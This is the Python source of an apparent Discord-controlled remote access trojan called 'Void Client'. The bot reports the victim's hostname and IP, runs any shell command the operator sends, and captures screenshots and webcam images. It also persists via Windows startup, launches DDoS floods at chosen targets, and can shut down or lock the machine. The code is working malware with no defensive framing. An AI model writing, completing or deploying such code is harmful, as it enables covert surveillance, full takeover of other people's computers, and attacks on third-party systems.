from discord.ext import commands
from commands import Command, DDOS, Say
import discord
import time
import asyncio
import datetime
import socket
import ctypes
import os
import requests
import subprocess

BOT_TOKEN = ""
MAIN_CHANNEL_ID = int("")
VOID_CHANNEL_ID = int("")
SHELL_CHANNEL_ID = int("")
USER_ID = int("")

# Enable intents
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
mention = f"<@!{USER_ID}>"

# Clear console on startup
os.system('cls' if os.name == 'nt' else 'clear')

def ip():
    """Get the public IP address of the machine"""
    try:
        return requests.get("https://api64.ipify.org?format=text").text
    except requests.RequestException:
        return "Unknown IP"

@bot.event
async def on_ready():
    """Handle bot startup events"""
    print(f"BOT IS ONLINE AS : {bot.user}")

    date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Setup void channel
    void_channel = bot.get_channel(VOID_CHANNEL_ID)
    if void_channel:
        await void_channel.purge(limit=None)
        await void_channel.send(f"\n{mention} : Void Client  |  {socket.gethostname()}  |  {ip()}  | {date}\n")

    # Setup shell channel
    shell_channel = bot.get_channel(SHELL_CHANNEL_ID)
    if shell_channel:
        await shell_channel.purge(limit=None)
        await shell_channel.send(f"{bot.user.mention} Shell : Running...")

@bot.event
async def on_message(message):
    """Handle incoming messages"""
    if message.author == bot.user:
        return

    # Handle shell commands in shell channel
    if message.channel.id == SHELL_CHANNEL_ID:
        if message.author.id != USER_ID:
            return await message.channel.send("Permission denied!")
        
        command = message.content.strip()
        
        if command == "clear":
            await message.channel.purge(limit=None)
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout or result.stderr
                if not output:
                    output = f"{mention} Command executed!"
            except Exception as e:
                output = f"Error: {e}"
            
            # Handle long outputs
            if len(output) > 1990:  # Discord message limit is 2000 chars
                chunks = [output[i:i+1990] for i in range(0, len(output), 1990)]
                for chunk in chunks:
                    await message.channel.send(f"```{chunk}```")
            else:
                await message.channel.send(f"```{output}```")
    
    # Continue processing commands
    await bot.process_commands(message)

@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx):
    """Clear all messages in the current channel"""
    await ctx.channel.purge(limit=None)
    await ctx.send("Channel cleared!", delete_after=3)  # Feedback message that deletes after 3 seconds

@bot.command()
async def screenshot(ctx):
    """Take a screenshot of the target machine"""
    command_instance = Command()  # Fixed: Create an instance of Command
    command_instance.screenshot()
    
    # Check if file exists before sending
    if os.path.exists("screenshot.png"):
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    else:
        await ctx.send("Failed to take screenshot.")

@bot.command()
async def openurl(ctx, url):
    """Open a URL in the default browser"""
    command_instance = Command()  # Fixed: Create an instance of Command
    result = command_instance.open_browser(url)
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def message(ctx, *, message):
    """Display a message on the target machine"""
    command_instance = Command()  # Fixed: Create an instance of Command
    result = command_instance.display_message(message)
    await ctx.send(f"{ctx.author.mention} Message sent! : {message}")

@bot.command()
async def takepic(ctx):
    """Take a picture using the webcam"""
    command_instance = Command()  # Fixed: Create an instance of Command
    result = command_instance.take_picture()
    
    # Check if file exists before sending
    if os.path.exists("webcam.png"):
        await ctx.send(file=discord.File("webcam.png"))
        os.remove("webcam.png")
    else:
        await ctx.send(f"Failed to take picture: {result}")

@bot.command()
async def systeminfo(ctx):
    """Get system information"""
    command_instance = Command()  # Fixed: Create an instance of Command
    info = command_instance.systeminfo()
    await ctx.send(info)

@bot.command()
async def admin(ctx):
    """Check if the process has admin privileges"""
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    if is_admin():
        await ctx.send(f"```\n{ctx.author.mention} Admin : [Yes]\n```")
    else:
        await ctx.send(f"```\n{ctx.author.mention} Admin : [No]\n```")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def detach(ctx):
    """Terminate the bot and exit the program"""
    await ctx.send(f"{ctx.author.mention} Detaching client...")
    time.sleep(0.3)
    await ctx.channel.purge(limit=None)
    await bot.close()
    os._exit(0)

@bot.command()
async def ddos(ctx, ip, port, time):
    """Start a DDoS attack on a target IP and port"""
    try:
        port = int(port)
        ddos_instance = DDOS()
        result = ddos_instance.start(target_ip=ip, target_port=port)
        
        # Fixed: Handle the return value properly
        if "started" in result:
            if time.isdigit():
                await ctx.send(f"```\nDDoS attack started on {ip}:{port}...\n```")
                await ctx.send(f"```\nDDoS attack will end after {time}s.\n```")
                await asyncio.sleep(int(time))  # Wait for 10 seconds before stopping the attack
                ddos_instance.stop()
                await ctx.send(f"```\nDDoS attack stopped.\n```")
            elif int(time) <= 0:
                await ctx.send(f"```\nInvalid time!\n```")
            elif int(time) >= 20:
                await ctx.send(f"Invalid time! Maximum time is 20 seconds.\n```")
            else:
                await ctx.send(f"```\nInvalid time!\n```")
        else:
            await ctx.send(f"```\n{result}\n```")
    except ValueError:
        await ctx.send("```\nInvalid port number. Please enter a valid integer.\n```")
    except Exception as e:
        await ctx.send(f"```\nAn error occurred: {str(e)}\n```")

@bot.command()
async def startup(ctx):
    """Add the program to Windows startup"""
    command_instance = Command()  # Fixed: Create an instance of Command
    result = command_instance.add_to_startup()
    
    # Fixed: Use actual return values from function
    if "Successfully" in result:
        await ctx.send(f"```\n{result}\n```")
    else:
        await ctx.send(f"```\n{result}\n```")

@bot.command()
async def jumpscare(ctx):
    """Play a jumpscare video on the target machine"""
    result = Command.jumpscare()
    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def say(ctx, *, message):
    msg = f"{message}!!!"
    say_instance = Say()
    await say_instance.speak(msg)
    await ctx.send(f"```\nSuccessfully played : {message}\n```")

@bot.command()
async def shutdown(ctx):
    await ctx.send("```\nShutting down the computer...\n```")
    os.system("shutdown /s /t 5")

@bot.command()
async def restart(ctx):
    await ctx.send("```\nRestarting the computer...\n```")
    os.system("shutdown /r /t 5")

@bot.command()
async def lockscreen(ctx):
    await ctx.send("```\nStarting lockscreen mode...\n```")
    os.system("rundll32.exe user32.dll,LockWorkStation")

@bot.command()
async def removeWebcamCover(ctx):
    command_instance = Command()  # Fixed: Create an instance of Command
    command_instance.remove_webcam_cover()
    await ctx.send("```\nWebcam alert has been sent!\n```")

@bot.command()
async def changeWallpaper(ctx):
    """Change the wallpaper using an attached image."""
    
    if not ctx.message.attachments:
        await ctx.send("```\nPlease attach an image to set as wallpaper!\n```")
        return

    attachment = ctx.message.attachments[0]  # Get the first attachment
    if not (attachment.filename.endswith(".png") or attachment.filename.endswith(".jpg") or attachment.filename.endswith(".jpeg")):
        await ctx.send("```\nOnly PNG and JPG images are supported!\n```")
        return

    save_path = os.path.join(os.getenv('TEMP'), attachment.filename)
    command_instance = Command()
    result = await command_instance.change_wallpaper(attachment.url, save_path)
    await ctx.send(f"```\n{result}\n```")
    os.remove(save_path)
# Handle command errors
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"```\nMissing required argument: {error.param.name}\n```")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("```\nYou don't have permission to use this command.\n```")
    elif isinstance(error, commands.CommandNotFound):
        pass  # Ignore command not found errors
    else:
        await ctx.send(f"```\nAn error occurred: {str(error)}\n```")

# Start the bot
if __name__ == "__main__":
    bot.run(BOT_TOKEN)